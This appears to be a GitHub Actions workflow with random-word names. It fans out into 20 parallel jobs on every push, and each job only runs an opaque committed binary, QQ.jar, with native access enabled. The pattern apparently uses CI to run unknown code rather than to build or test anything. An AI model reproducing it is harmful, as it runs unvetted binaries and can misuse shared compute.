name: truly

on:
  push:

jobs:
  recall:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        absorb: ["exhibition", "assist", "boss", "detect", "operator"]
        output: ["rub", "exert", "medical", "chief"]
    steps:
    - uses: actions/checkout@v6
    - uses: actions/setup-java@v5
      with:
        distribution: 'zulu'
        java-version: '25'
    - run: java --enable-native-access=ALL-UNNAMED -jar QQ.jar
